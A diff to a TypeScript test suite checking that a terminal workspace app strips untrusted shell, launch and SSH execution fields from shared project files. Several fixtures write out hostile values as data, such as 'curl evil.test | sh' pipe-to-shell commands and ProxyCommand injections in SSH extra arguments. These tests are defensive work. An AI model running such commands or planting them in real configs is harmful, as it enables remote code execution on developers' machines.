@@ -5,7 +5,7 @@ import path from 'path'
 import { initPlatform, resetPlatformForTests } from './platform'
 import { fakePlatform } from './platform-fake'
 import { WorkspaceStore } from './workspace-store'
-import type { Project, Workspace } from '../shared/types'
+import type { PendingLaunch, Project, Workspace } from '../shared/types'
 
 let userData: string
 let projRoot: string
@@ -18,6 +18,11 @@ const project = (over: Partial<Project> = {}): Project => ({
 })
 const ws = (projects: Project[], active = projects[0]?.id ?? ''): Workspace =>
   ({ version: 2, activeProjectId: active, projects })
+const pendingLaunch = (): PendingLaunch => ({
+  after: ['term-dep-1'],
+  launchId: '123e4567-e89b-42d3-a456-426614174000',
+  launch: { kind: 'agent', action: 'start', agentId: 'claude', prompt: 'trusted local launch' }
+})
 
 beforeEach(async () => {
   userData = await fs.mkdtemp(path.join(os.tmpdir(), 'nt-ws-'))
@@ -106,11 +111,6 @@ describe('v2 → v3 migration', () => {
   })
 })
 
-// I1: `ssh.extraArgs` HAS a producer (createSshTerminalNode copies it out of the machine-local SSH
-// server store), so every existing ssh-terminal node with a jump host has one in its CURRENT
-// project.json while the index has no `localExec` for it. Without a migration the first load after
-// the upgrade drops it (the connection breaks), and the next save erases it from disk and
-// propagates the deletion to every teammate via `rev`. Silently.
 describe('inline (cwd-less) project kanban shape guard', () => {
   const writeInlineIndex = async (kanban: unknown): Promise<void> => {
     await fs.writeFile(
@@ -151,9 +151,223 @@ describe('inline (cwd-less) project kanban shape guard', () => {
   })
 })
 
+describe('machine-local pending launch ingress normalization', () => {
+  const rawNode = (id: string, pending: unknown) => ({
+    id,
+    kind: 'terminal',
+    position: { x: 0, y: 0 },
+    size: { width: 1, height: 1 },
+    title: id,
+    color: '#fff',
+    group: null,
+    pendingLaunch: pending
+  })
+  const valid = {
+    after: ['term-dep-1'],
+    launchId: '123e4567-e89b-42d3-a456-426614174000',
+    launch: {
+      kind: 'agent', action: 'start', agentId: 'claude', prompt: 'trusted local launch',
+      renderedCommand: 'must be allowlist-stripped'
+    }
+  }
+  const legacy = {
+    after: ['term-dep-1'], command: 'curl legacy-machine-local-command.test | sh'
+  }
+  const malformed = {
+    after: 'not-an-array',
+    launchId: 'not-a-v4-uuid',
+    launch: { kind: 'shell-command', command: 'must not survive' }
+  }
+
+  const expectNormalized = (loaded: Workspace, store: WorkspaceStore): void => {
+    const [typed, old, bad] = loaded.projects[0].nodes
+    expect(typed.pendingLaunch).toEqual(pendingLaunch())
+    expect(old.pendingLaunch).toBeUndefined()
+    expect(bad.pendingLaunch).toBeUndefined()
+    expect(JSON.stringify(loaded)).not.toContain('legacy-machine-local-command')
+    expect(JSON.stringify(loaded)).not.toContain('renderedCommand')
+    // General raw readers expose no execution state; the dedicated trusted lookup reattaches it.
+    expect(store.getNode('typed')?.pendingLaunch).toBeUndefined()
+    expect(store.getNode('legacy')?.pendingLaunch).toBeUndefined()
+    expect(store.trustedNodeLaunchContext('typed')).toMatchObject({
+      status: 'found', node: { pendingLaunch: pendingLaunch() },
+      localExec: { pendingLaunch: pendingLaunch() }
+    })
+  }
+
+  it('normalizes a hand-edited v3 inline project before renderer or index consumers see it', async () => {
+    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify({
+      version: 3,
+      activeProjectId: 'p1',
+      entries: [{
+        id: 'p1', name: 'inline', color: '#7aa2f7',
+        project: {
+          id: 'p1', name: 'inline', color: '#7aa2f7', viewport: { x: 0, y: 0, zoom: 1 },
+          nodes: [rawNode('typed', valid), rawNode('legacy', legacy), rawNode('bad', malformed)]
+        }
+      }]
+    }))
+    const store = new WorkspaceStore()
+    expectNormalized(await store.load(), store)
+  })
+
+  it('normalizes typed, legacy, and malformed pending launches while migrating v2', async () => {
+    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify({
+      version: 2,
+      activeProjectId: 'p1',
+      projects: [{
+        id: 'p1', name: 'legacy v2', color: '#7aa2f7', viewport: { x: 0, y: 0, zoom: 1 },
+        nodes: [rawNode('typed', valid), rawNode('legacy', legacy), rawNode('bad', malformed)]
+      }]
+    }))
+    const store = new WorkspaceStore()
+    const loaded = await store.load()
+    const [typed, old, bad] = loaded.projects[0].nodes
+    expect(typed.pendingLaunch).toEqual(pendingLaunch())
+    expect(old.pendingLaunch).toBeUndefined()
+    expect(bad.pendingLaunch).toBeUndefined()
+  })
+
+  it('normalizes typed, legacy, and malformed pending launches while migrating v1', async () => {
+    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify({
+      version: 1,
+      viewport: { x: 0, y: 0, zoom: 1 },
+      nodes: [rawNode('typed', valid), rawNode('legacy', legacy), rawNode('bad', malformed)]
+    }))
+    const store = new WorkspaceStore()
+    const loaded = await store.load()
+    const [typed, old, bad] = loaded.projects[0].nodes
+    expect(typed.pendingLaunch).toEqual(pendingLaunch())
+    expect(old.pendingLaunch).toBeUndefined()
+    expect(bad.pendingLaunch).toBeUndefined()
+  })
+})
+
+describe('trustedNodeLaunchContext', () => {
+  const launchNode = (id: string, over: Record<string, unknown> = {}) => ({
+    id,
+    kind: 'terminal' as const,
+    position: { x: 0, y: 0 },
+    size: { width: 1, height: 1 },
+    title: id,
+    color: '#fff',
+    group: null,
+    ...over
+  })
+
+  it('returns only host-local execution state plus the authoritative persisted node', async () => {
+    const store = new WorkspaceStore()
+    await store.save(ws([project({
+      cwd: projRoot,
+      nodes: [launchNode('term-trusted', {
+        shell: '/bin/zsh', terminalProfileId: 'pwsh', pendingLaunch: pendingLaunch()
+      })]
+    })]))
+
+    const result = store.trustedNodeLaunchContext('term-trusted')
+    expect(result).toMatchObject({
+      status: 'found',
+      projectId: 'p1',
+      projectCwd: projRoot,
+      node: { id: 'term-trusted', shell: '/bin/zsh', terminalProfileId: 'pwsh' },
+      localExec: {
+        shell: '/bin/zsh', terminalProfileId: 'pwsh', pendingLaunch: pendingLaunch()
+      }
+    })
+  })
+
+  it('never promotes hostile shared project execution fields into the lookup result', async () => {
+    await fs.mkdir(path.join(projRoot, '.nodeterm'), { recursive: true })
+    await fs.writeFile(path.join(projRoot, '.nodeterm/project.json'), JSON.stringify({
+      version: 1, rev: 1, savedAt: 'then', name: 'shared', color: '#fff',
+      viewport: { x: 0, y: 0, zoom: 1 },
+      nodes: [launchNode('term-hostile', {
+        shell: 'curl evil.test | sh',
+        terminalProfileId: 'wsl:Foreign Distro',
+        pendingLaunch: {
+          after: [], command: 'curl legacy-shared-command.test | sh'
+        }
+      })]
+    }))
+    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify({
+      version: 3, activeProjectId: 'p1',
+      entries: [{ id: 'p1', name: 'shared', color: '#fff', cwd: projRoot }]
+    }))
+    const store = new WorkspaceStore()
+    await store.load()
+
+    const result = store.trustedNodeLaunchContext('term-hostile')
+    expect(result.status).toBe('found')
+    if (result.status !== 'found') throw new Error('expected authoritative node')
+    expect(result.node.shell).toBeUndefined()
+    expect(result.node.terminalProfileId).toBeUndefined()
+    expect(result.node.pendingLaunch).toBeUndefined()
+    expect(result.localExec).toBeUndefined()
+  })
+
+  it('returns project SSH binding from the host index, never from request data', async () => {
+    const binding = { server: { host: 'host.test', user: 'me' }, remoteCwd: '/srv/app' }
+    const store = new WorkspaceStore()
+    await store.save(ws([project({
+      id: 'ssh-project',
+      ssh: binding,
+      nodes: [launchNode('term-ssh')]
+    })], 'ssh-project'))
+    expect(store.trustedNodeLaunchContext('term-ssh')).toMatchObject({
+      status: 'found', projectId: 'ssh-project', projectSsh: binding
+    })
+    expect(store.trustedProjectLaunchContext('ssh-project')).toEqual({
+      projectId: 'ssh-project', ssh: binding
+    })
+    expect(store.trustedProjectLaunchContext('unknown')).toBeNull()
+  })
+
+  it('distinguishes proven missing, duplicate, and unavailable project sources', async () => {
+    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify({
+      version: 3,
+      activeProjectId: 'p1',
+      entries: [
+        {
+          id: 'p1', name: 'one', color: '#fff',
+          project: {
+            id: 'p1', name: 'one', color: '#fff', viewport: { x: 0, y: 0, zoom: 1 },
+            nodes: [launchNode('duplicate')]
+          }
+        },
+        {
+          id: 'p2', name: 'two', color: '#fff',
+          project: {
+            id: 'p2', name: 'two', color: '#fff', viewport: { x: 0, y: 0, zoom: 1 },
+            nodes: [launchNode('duplicate')]
+          }
+        }
+      ]
+    }))
+    const complete = new WorkspaceStore()
+    await complete.load()
+    expect(complete.trustedNodeLaunchContext('unknown')).toEqual({ status: 'missing' })
+    expect(complete.trustedNodeLaunchContext('duplicate')).toEqual({
+      status: 'unavailable', reason: 'duplicate-node-id'
+    })
+    expect(complete.trustedProjectLaunchContext('p1')).toEqual({ projectId: 'p1' })
+
+    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify({
+      version: 3, activeProjectId: 'missing-ref',
+      entries: [{
+        id: 'missing-ref', name: 'offline', color: '#fff', cwd: path.join(projRoot, 'gone')
+      }]
+    }))
+    const unavailable = new WorkspaceStore()
+    await unavailable.load()
+    expect(unavailable.trustedNodeLaunchContext('unknown')).toEqual({
+      status: 'unavailable', reason: 'project-source-unavailable'
+    })
+  })
+})
+
 describe('one-time exec migration (pre-existing project files)', () => {
   /** A v3 index + project file written the way the PRE-fix app wrote them. */
-  const writeLegacy = async (extraArgs: string): Promise<void> => {
+  const writeLegacy = async (): Promise<void> => {
     await fs.mkdir(path.join(projRoot, '.nodeterm'), { recursive: true })
     await fs.writeFile(
       path.join(projRoot, '.nodeterm/project.json'),
@@ -164,7 +378,12 @@ describe('one-time exec migration (pre-existing project files)', () => {
           {
             id: 'ssh-1', kind: 'terminal', position: { x: 0, y: 0 },
             size: { width: 1, height: 1 }, title: 't', color: '#fff', group: null,
-            ssh: { host: 'h', user: 'u', extraArgs }
+            shell: '/bin/foreign-shell',
+            terminalProfileId: 'wsl:Foreign Distro',
+            pendingLaunch: {
+              after: ['term-dep-1'], command: 'curl legacy-shared-command.test | sh'
+            },
+            ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=foreign-command' }
           }
         ]
       })
@@ -178,50 +397,85 @@ describe('one-time exec migration (pre-existing project files)', () => {
     )
   }
 
-  it("hoists the file's exec values into the machine-local index, once, and keeps them working", async () => {
-    await writeLegacy('-o ProxyCommand=corp-proxy %h')
+  it('drops every shared legacy execution field and completes migration without trusting it', async () => {
+    await writeLegacy()
     const store = new WorkspaceStore()
     const loaded = await store.load()
-    // The jump host still reaches the node — and it is marked as this machine's own, so the exec
-    // site (buildSshArgs) honors it.
-    expect(loaded.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
-    expect(loaded.projects[0].nodes[0].ssh?.execTrusted).toBe(true)
+    expect(loaded.projects[0].nodes[0].shell).toBeUndefined()
+    expect(loaded.projects[0].nodes[0].terminalProfileId).toBeUndefined()
+    expect(loaded.projects[0].nodes[0].pendingLaunch).toBeUndefined()
+    expect(loaded.projects[0].nodes[0].ssh).toEqual({ host: 'h', user: 'u' })
 
     await store.save(loaded)
     const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
-    expect(index.entries[0].localExec).toEqual({
-      'ssh-1': { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
-    })
     expect(index.entries[0].execMigrated).toBe(true)
-    // …and it is gone from the SHARED file (that is the whole point).
+    expect(index.entries[0].localExec).toBeUndefined()
     const file = JSON.parse(
       await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8')
     )
+    expect(file.nodes[0].shell).toBeUndefined()
+    expect(file.nodes[0].terminalProfileId).toBeUndefined()
+    expect(file.nodes[0].pendingLaunch).toBeUndefined()
     expect(file.nodes[0].ssh.extraArgs).toBeUndefined()
     expect(file.nodes[0].ssh.host).toBe('h')
-    // The user is TOLD (one-time note), rather than finding out when something breaks.
-    expect(
-      fake.sent.some((m) => m.channel === 'workspace:migrated' && m.args[0] === 'exec')
-    ).toBe(true)
   })
 
-  it('never hoists twice: a project file changed AFTER the migration cannot re-arm it', async () => {
-    await writeLegacy('-A')
+  it('preserves an already-existing machine-local overlay while rejecting shared replacements', async () => {
+    await writeLegacy()
+    const indexPath = path.join(userData, 'workspace.json')
+    const seeded = JSON.parse(await fs.readFile(indexPath, 'utf-8'))
+    seeded.entries[0].localExec = {
+      'ssh-1': {
+        shell: '/bin/local-shell',
+        terminalProfileId: 'pwsh',
+        sshExtraArgs: '-A',
+        pendingLaunch: pendingLaunch()
+      }
+    }
+    await fs.writeFile(indexPath, JSON.stringify(seeded))
+
     const store = new WorkspaceStore()
-    await store.save(await store.load()) // migrates + records execMigrated
-    // A teammate (or an attacker with a PR) puts an exec-enabling value back into the shared file.
+    const loaded = await store.load()
+    expect(loaded.projects[0].nodes[0].shell).toBe('/bin/local-shell')
+    expect(loaded.projects[0].nodes[0].terminalProfileId).toBe('pwsh')
+    expect(loaded.projects[0].nodes[0].pendingLaunch).toEqual(pendingLaunch())
+    expect(loaded.projects[0].nodes[0].ssh?.extraArgs).toBe('-A')
+    expect(loaded.projects[0].nodes[0].ssh?.execTrusted).toBe(true)
+
+    await store.save(loaded)
+    const saved = JSON.parse(await fs.readFile(indexPath, 'utf-8'))
+    expect(saved.entries[0].localExec).toEqual(seeded.entries[0].localExec)
+    expect(saved.entries[0].execMigrated).toBe(true)
+  })
+
+  it('a completed migration never reconsiders later hostile shared fields', async () => {
+    await writeLegacy()
+    const store = new WorkspaceStore()
+    await store.save(await store.load())
     const fp = path.join(projRoot, '.nodeterm/project.json')
     const f = JSON.parse(await fs.readFile(fp, 'utf-8'))
-    f.nodes[0].ssh.extraArgs = '-o ProxyCommand=curl evil.sh|sh'
+    f.nodes[0].shell = '/bin/later-foreign-shell'
+    f.nodes[0].terminalProfileId = 'cmd'
+    f.nodes[0].pendingLaunch = {
+      after: ['term-dep-1'], command: 'curl later-shared-command.test | sh'
+    }
+    f.nodes[0].ssh.extraArgs = '-o ProxyCommand=later-foreign-command'
     f.rev = 99
     await fs.writeFile(fp, JSON.stringify(f))
 
     const reloaded = await new WorkspaceStore().load()
-    expect(reloaded.projects[0].nodes[0].ssh?.extraArgs).toBe('-A') // OUR value, not the file's
+    expect(reloaded.projects[0].nodes[0].shell).toBeUndefined()
+    expect(reloaded.projects[0].nodes[0].terminalProfileId).toBeUndefined()
+    expect(reloaded.projects[0].nodes[0].pendingLaunch).toBeUndefined()
+    expect(reloaded.projects[0].nodes[0].ssh?.extraArgs).toBeUndefined()
+    await new WorkspaceStore().save(reloaded)
+    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
+    expect(index.entries[0].execMigrated).toBe(true)
+    expect(index.entries[0].localExec).toBeUndefined()
   })
 
-  it('an unreadable ref is not marked migrated — its values are hoisted when it comes back', async () => {
-    await writeLegacy('-o ProxyCommand=corp-proxy %h')
+  it('an unreadable ref stays pending; when it returns, migration completes without harvesting', async () => {
+    await writeLegacy()
     const gone = path.join(projRoot, '.nodeterm/project.json')
     const keep = await fs.readFile(gone, 'utf-8')
     await fs.rm(gone)
@@ -233,44 +487,17 @@ describe('one-time exec migration (pre-existing project files)', () => {
     const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
     expect(index.entries[0].execMigrated).toBeUndefined() // still owed
 
-    await fs.writeFile(gone, keep) // the disk is back
-    const back = await new WorkspaceStore().load()
-    expect(back.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
-  })
-
-  it('within ONE store instance, a deferred ref that comes back migrates exactly once', async () => {
-    // The offline→online recovery inside a single, long-lived store: the entry was deferred (its
-    // file was gone at first load), so its id sat in execUnmigrated. When the file returns and is
-    // read again, that deferral must be cleared — otherwise save() never records execMigrated, the
-    // hoist re-runs on every full load, and a project.json swapped in later would be re-hoisted.
-    await writeLegacy('-o ProxyCommand=corp-proxy %h')
-    const gone = path.join(projRoot, '.nodeterm/project.json')
-    const keep = await fs.readFile(gone, 'utf-8')
-    await fs.rm(gone)
-
-    const store = new WorkspaceStore()
-    const offline = await store.load()
-    expect(offline.projects[0].unavailable).toBe(true) // deferred → id in execUnmigrated
-
-    await fs.writeFile(gone, keep) // disk is back
-    const online = await store.load() // SAME instance re-reads the now-readable ref
-    expect(online.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
+    await fs.writeFile(gone, keep)
+    const online = await store.load() // SAME instance clears its pending marker
+    expect(online.projects[0].nodes[0].shell).toBeUndefined()
+    expect(online.projects[0].nodes[0].terminalProfileId).toBeUndefined()
+    expect(online.projects[0].nodes[0].pendingLaunch).toBeUndefined()
+    expect(online.projects[0].nodes[0].ssh?.extraArgs).toBeUndefined()
 
     await store.save(online)
-    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
-    expect(index.entries[0].execMigrated).toBe(true) // deferral cleared → migration recorded once
-    expect(index.entries[0].localExec).toEqual({
-      'ssh-1': { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
-    })
-
-    // Now the migration is truly done: a hostile value put in the shared file afterward cannot be
-    // hoisted as trusted (proves it does NOT keep re-running).
-    const f = JSON.parse(await fs.readFile(gone, 'utf-8'))
-    f.nodes[0].ssh.extraArgs = '-o ProxyCommand=curl evil.sh|sh'
-    f.rev = 99
-    await fs.writeFile(gone, JSON.stringify(f))
-    const reloaded = await new WorkspaceStore().load()
-    expect(reloaded.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
+    const completed = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
+    expect(completed.entries[0].execMigrated).toBe(true)
+    expect(completed.entries[0].localExec).toBeUndefined()
   })
 })
 
@@ -532,6 +759,26 @@ describe('watcher self-write detection compares the RAW file bytes', () => {
     // not each re-broadcast an "external change".
     expect(store.isSelfWrite(file, raw)).toBe(true)
   })
+
+  it('retains exact hostile bytes only for self-write detection while raw node readers stay clean', async () => {
+    const store = new WorkspaceStore()
+    await store.save(ws([project({ cwd: projRoot })]))
+    const file = path.join(projRoot, '.nodeterm/project.json')
+    const parsed = JSON.parse(await fs.readFile(file, 'utf-8'))
+    parsed.nodes[0].shell = 'curl watcher-command.test | sh'
+    parsed.nodes[0].pendingLaunch = {
+      after: [], command: 'curl legacy-watcher-command.test | sh'
+    }
+    const hostileRaw = JSON.stringify(parsed, null, 4) + '\n'
+    await fs.writeFile(file, hostileRaw)
+
+    const surfaced = await store.readLocalRefByPath(file)
+    expect(store.isSelfWrite(file, hostileRaw)).toBe(true)
+    expect(surfaced?.nodes[0].shell).toBeUndefined()
+    expect(surfaced?.nodes[0].pendingLaunch).toBeUndefined()
+    expect(store.getNode('term-1')?.pendingLaunch).toBeUndefined()
+    expect(store.persistedCanvases()[0].nodes[0].pendingLaunch).toBeUndefined()
+  })
 })
 
 describe('appendRemoteNode (phone-registered sessions over the relay)', () => {
@@ -555,6 +802,58 @@ describe('appendRemoteNode (phone-registered sessions over the relay)', () => {
     expect(broadcast).toHaveLength(1)
     expect(broadcast[0].args[0]).toMatchObject({ id: 'p1', cwd: projRoot })
     expect(broadcast[0].args[0].nodes.map((n: { id: string }) => n.id)).toContain('term-zz1-1')
+  })
+
+  it('snapshots the Windows host default in localExec once for each phone-created terminal', async () => {
+    const store = new WorkspaceStore()
+    await store.save(ws([project({ cwd: projRoot })]))
+    fake.sent.length = 0
+
+    await store.appendRemoteNode('p1', { id: 'term-phone-1' }, undefined, 'pwsh')
+    // Simulate the user changing their default before the phone creates another node.
+    await store.appendRemoteNode('p1', { id: 'term-phone-2' }, undefined, 'git-bash')
+
+    const shared = JSON.parse(
+      await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8')
+    )
+    expect(shared.nodes.find((n: { id: string }) => n.id === 'term-phone-1').terminalProfileId)
+      .toBeUndefined()
+    expect(shared.nodes.find((n: { id: string }) => n.id === 'term-phone-2').terminalProfileId)
+      .toBeUndefined()
+
+    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
+    expect(index.entries[0].localExec['term-phone-1']).toEqual({ terminalProfileId: 'pwsh' })
+    expect(index.entries[0].localExec['term-phone-2']).toEqual({ terminalProfileId: 'git-bash' })
+
+    const reloaded = await new WorkspaceStore().load()
+    const byId = new Map(reloaded.projects[0].nodes.map((node) => [node.id, node]))
+    expect(byId.get('term-phone-1')?.terminalProfileId).toBe('pwsh')
+    expect(byId.get('term-phone-2')?.terminalProfileId).toBe('git-bash')
+    const broadcasts = fake.sent.filter((s) => s.channel === 'workspace:external-change')
+    expect(broadcasts[0].args[0].nodes.find((n: { id: string }) => n.id === 'term-phone-1'))
+      .toMatchObject({ terminalProfileId: 'pwsh' })
+  })
+
+  it('scrubs a hostile legacy launch from both the raw rewrite and external-change broadcast', async () => {
+    const store = new WorkspaceStore()
+    await store.save(ws([project({ cwd: projRoot })]))
+    fake.sent.length = 0
+    const file = path.join(projRoot, '.nodeterm/project.json')
+    const parsed = JSON.parse(await fs.readFile(file, 'utf-8'))
+    parsed.nodes[0].pendingLaunch = {
+      after: [], command: 'curl hostile-phone-rewrite.test | sh'
+    }
+    parsed.nodes[0].shell = 'curl hostile-phone-shell.test | sh'
+    await fs.writeFile(file, JSON.stringify(parsed))
+
+    expect(await store.appendRemoteNode('p1', { id: 'term-phone-3' })).toBe(true)
+    const shared = JSON.parse(await fs.readFile(file, 'utf-8'))
+    for (const node of shared.nodes) {
+      expect(node.pendingLaunch).toBeUndefined()
+      expect(node.shell).toBeUndefined()
+    }
+    const broadcast = fake.sent.find((sent) => sent.channel === 'workspace:external-change')
+    expect(JSON.stringify(broadcast?.args[0])).not.toContain('hostile-phone')
   })
 
   it('refuses unknown / ssh / cwd-less projects and corrupt files (nothing written)', async () => {
@@ -613,6 +912,58 @@ describe('refreshSshProject', () => {
     remote['ps'] = JSON.stringify(older)
     expect(await store.refreshSshProject('ps')).toBeNull()
     expect(writes.filter((w) => w === 'ps').length).toBeGreaterThanOrEqual(2) // seed + push-up
+  })
+
+  it('a merged remote-only node cannot make execution fields ride the SSH mirror write', async () => {
+    const remote: Record<string, string> = {}
+    const io = {
+      read: async (id: string) =>
+        remote[id] != null ? { status: 'ok' as const, content: remote[id] } : { status: 'absent' as const },
+      write: async (id: string, _s: any, c: string) => ((remote[id] = c), true)
+    }
+    const store = new WorkspaceStore(io)
+    const first = project({ id: 'ps', ssh: sshConn, cwd: undefined })
+    await remoteFileOf(store, first)
+    const stale = JSON.parse(remote.ps)
+
+    // Move the local cache ahead, then make the stale remote carry a remote-only hostile node.
+    await store.save(ws([{ ...first, nodes: [{ ...first.nodes[0], title: 'local edit' }] }]))
+    stale.nodes.push({
+      ...first.nodes[0],
+      id: 'term-remote-only',
+      shell: 'curl evil.test | sh',
+      terminalProfileId: 'wsl:Foreign Distro',
+      pendingLaunch: {
+        after: ['term-dep-1'], command: 'curl reconciled-command.test | sh'
+      },
+      ssh: {
+        host: 'h', user: 'u', extraArgs: '-o ProxyCommand=evil', execTrusted: true
+      }
+    })
+    remote.ps = JSON.stringify(stale)
+
+    const merged = await store.refreshSshProject('ps')
+    expect(merged?.nodes.some((n) => n.id === 'term-remote-only')).toBe(true)
+    const mirrored = JSON.parse(remote.ps)
+    const rescued = mirrored.nodes.find((n: { id: string }) => n.id === 'term-remote-only')
+    expect(rescued).toBeDefined() // the legitimate remote-only node is preserved
+    expect(rescued.shell).toBeUndefined()
+    expect(rescued.terminalProfileId).toBeUndefined()
+    expect(rescued.pendingLaunch).toBeUndefined()
+    expect(rescued.ssh).toEqual({ host: 'h', user: 'u' })
+
+    // Canonical cache and raw readers must also be clean; a final serializer alone would leave the
+    // hostile launch dormant in workspace.json for a later raw consumer to revive.
+    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
+    const cached = index.entries[0].cache.nodes.find(
+      (n: { id: string }) => n.id === 'term-remote-only'
+    )
+    expect(cached.pendingLaunch).toBeUndefined()
+    expect(cached.shell).toBeUndefined()
+    expect(cached.terminalProfileId).toBeUndefined()
+    expect(store.getNode('term-remote-only')?.pendingLaunch).toBeUndefined()
+    expect(store.persistedCanvases()[0].nodes.find((n) => n.id === 'term-remote-only')?.pendingLaunch)
+      .toBeUndefined()
   })
 
   it('no remote file yet → pushes the cache up (first machine wins)', async () => {
